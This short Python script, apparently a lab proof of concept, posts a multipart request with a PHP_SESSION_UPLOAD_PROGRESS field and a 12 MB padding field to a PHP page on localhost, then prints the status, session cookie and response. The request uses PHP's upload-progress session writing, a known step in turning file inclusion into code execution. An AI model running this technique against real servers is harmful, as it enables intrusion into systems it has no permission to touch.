import urllib.request
B = "SSSSSSSSSSSSSSSSS"
def part(name, data):
    return (f'--{B}\r\nContent-Disposition: form-data; name="{name}"\r\n\r\n'
            .encode() + data + b"\r\n")
body = (part("PHP_SESSION_UPLOAD_PROGRESS", b"pwn")
        + part("big", b"B" * (12 * 1024 * 1024))
        + f"--{B}--\r\n".encode())
req = urllib.request.Request("http://127.0.0.1:8088/index.php", data=body,
      headers={"Content-Type": f"multipart/form-data; boundary={B}"})
r = urllib.request.urlopen(req, timeout=60)
print("status:", r.status)
print("cookie:", r.headers.get("Set-Cookie"))
print(r.read()[:300].decode(errors="replace"))

